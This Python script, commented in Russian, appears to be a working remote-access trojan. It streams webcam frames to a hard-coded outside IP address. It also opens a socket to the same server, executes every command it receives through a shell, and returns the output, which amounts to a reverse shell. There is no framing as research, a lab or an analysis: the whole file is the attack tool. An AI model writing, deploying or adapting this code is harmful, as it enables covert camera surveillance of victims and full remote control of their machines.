import cv2
import requests
import threading
import socket
import subprocess
import time

# Переменные для видеопотока
cap = cv2.VideoCapture(0)

if not cap.isOpened():
    print("Error: Camera not found!")
    exit()

cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 100]
server_url = "http://54.89.160.24:5000/upload"

# Переменные для сокет-соединения
server_ip = '54.89.160.24'  # IP-адрес сервера
server_port = 12345  # Порт сервера

# Очередь для кадров
frame_queue = []
frame_lock = threading.Lock()

# Функция для захвата кадров
def capture_frames():
    while True:
        ret, frame = cap.read()
        if not ret:
            print("Error: Failed to capture image")
            break

        with frame_lock:
            frame_queue.append(frame)

# Функция для отправки кадров на сервер
def send_frames():
    while True:
        if frame_queue:
            with frame_lock:
                frame = frame_queue.pop(0)

            ret, jpeg = cv2.imencode('.jpg', frame, encode_param)
            if not ret:
                print("Error: Failed to encode frame")
                continue

            try:
                response = requests.post(server_url, files={'file': jpeg.tobytes()})
                if response.status_code != 200:
                    print(f"Error: Failed to send frame to server. Status code {response.status_code}")
            except Exception as e:
                print(f"Error: {e}")

        time.sleep(0.01)

# Функция для обработки команд через сокет
def handle_commands():
    # Создаем сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))

    while True:
        command = sock.recv(1024).decode('utf-8')
        
        if command.lower() == 'exit':
            break
        
        # Выполняем команду
        output = subprocess.run(command, shell=True, capture_output=True)
        
        # Отправляем результат обратно на сервер
        sock.send(output.stdout + output.stderr)

    sock.close()

# Создаем и запускаем потоки
capture_thread = threading.Thread(target=capture_frames)
send_thread = threading.Thread(target=send_frames)
command_thread = threading.Thread(target=handle_commands)

capture_thread.start()
send_thread.start()
command_thread.start()

# Ожидаем завершения работы потоков
capture_thread.join()
send_thread.join()
command_thread.join()

cap.release()
